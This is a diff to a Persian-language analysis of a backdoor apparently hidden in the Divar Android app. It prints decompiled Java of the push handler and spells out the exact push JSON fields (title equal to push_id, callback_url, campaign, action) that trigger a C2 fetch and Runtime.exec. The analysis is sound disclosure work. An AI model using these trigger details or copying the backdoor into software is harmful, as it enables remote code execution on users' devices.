@@ -298,9 +298,45 @@ Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "/data/data/ir.divar/fi
 
 ---
 
-## نمونه پوش مهاجم
+## دو سند JSON در این حمله
 
-یک پوش OneSignal که پس از پردازش, این فیلدها را تولید کند:
+در این حمله دو سند JSON کاملاً جدا وجود دارد که نباید با هم اشتباه شوند:
+
+1. **JSON فعال‌ساز (trigger):** از سرور پوش (OneSignal) می‌آید و فقط نقش ماشه را دارد.
+2. **JSON فرمان (C2):** پس از فعال شدن، توسط خود اپ از سرور مهاجم گرفته می‌شود و فرمان واقعی اجرا در آن است.
+
+### JSON اول — پوش فعال‌ساز
+
+متد `Wk.g.f` (مرجع: `src/Wk_g.java` و `jadx_out/wk/sources/Wk/g.java` خط ۶۱۹) پوش را این‌طور می‌خواند — این بخش از خروجی jadx و عیناً از کد است:
+
+<div dir="ltr">
+
+```java
+String push_id = jSONObject.optString("push_id");
+
+JSONObject custom = null;
+if (!title.equals("") && title.equals(push_id)) {      // title نوتیفیکیشن باید == push_id
+    custom = new JSONObject(body);                     // body نوتیفیکیشن باید خودش JSON باشد
+}
+
+if (custom != null
+    && !custom.optString("callback_url").equals("")
+    && !custom.optString("campaign").equals("")
+    && !custom.optString("action").equals("")) {
+
+    String u = custom.optString("campaign");
+    context.sendBroadcast(
+        new Intent()
+            .setClassName(context, custom.getString("action"))  // کلاس مقصد از action
+            .setData(Uri.parse(u))                              // dataString = campaign
+            .putExtra(u, u));                                   // extras[campaign] = campaign
+    return;
+}
+```
+
+</div>
+
+برای فعال شدن، پوش باید پس از پردازش این مقادیر را تولید کند:
 
 <div dir="ltr">
 
@@ -317,10 +353,16 @@ Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "/data/data/ir.divar/fi
 <div dir="ltr">
 
 - `title == push_id` → ورود به شاخه ویژه در `Wk.g.f`.
-- `campaign` = آدرس سرور فرمان، به شکل Base64(XOR(url, 0x68)).
-- `action` = نام کلاس receiver مقصد.
+- `body` باید یک رشته JSON باشد شامل سه کلید پرشده: `callback_url`, `campaign`, `action`.
+- `campaign` = آدرس سرور فرمان، به شکل `Base64(XOR(url, 0x68))`. همین مقدار هم `setData` می‌شود و هم `putExtra(u, u)`؛ و `putExtra(u, u)` دقیقاً شرط `extras.getString(dataString).equals(dataString)` را در گیرنده برآورده می‌کند.
+- `action` = نام کلاس receiver مقصد (`ChatPushNotificationOpenHandler`).
+- `callback_url` فقط باید خالی نباشد؛ مقدارش نقش عملیاتی ندارد.
 
 </div>
+
+### JSON دوم — فرمان سرور C2
+
+این سند توسط `ReportDeserializer.a()` با یک درخواست `GET` به آدرس رمزگشایی‌شده گرفته می‌شود و حاوی فرمان واقعی است. ساختار و مقدارهای نمونه آن در بخش [نمونه فرمان سرور](#نمونه-فرمان-سرور) بالا آمده. خط نهایی اجرا در `run()` عملاً معادل `Runtime.getRuntime().exec(...)` است. یعنی **خود فرآیند اپ دیوار** کد مهاجم را با سطح دسترسی خودش اجرا می‌کند.
 
 ### رمزگذاری و رمزگشایی آدرس
 
@@ -369,9 +411,13 @@ def decode(campaign: str) -> str:
 |------|-------|
 | `src/ChatPushNotificationOpenHandler.java` | خروجی jadx از نقطه فعال‌سازی |
 | `src/ReportDeserializer.java` | خروجی jadx از اجراکننده فرمان |
-| `src/Wk_g_f.smali` | disassembly متد سازنده Intent از پوش |
+| `src/Wk_g.java` | خروجی jadx از کلاس سازنده Intent از پوش |
+| `src/Wk_g_f.smali` | disassembly متد `f` از همان کلاس |
+| `jadx_out/` | خروجی کامل jadx برای کلاس‌های مرتبط (منبع اصلی) |
 | `scan.sh` | اسکریپت تشخیص آلودگی روی یک APK |
 | `apk/` | نسخه‌های APK بررسی‌شده |
+
+مرجع دقیق کد: متد `f` در `jadx_out/wk/sources/Wk/g.java:619`، و دو کلاس `ReportDeserializer` و `ChatPushNotificationOpenHandler` در `jadx_out/old/sources/ir/divar/chat/`.
 
 ---
 
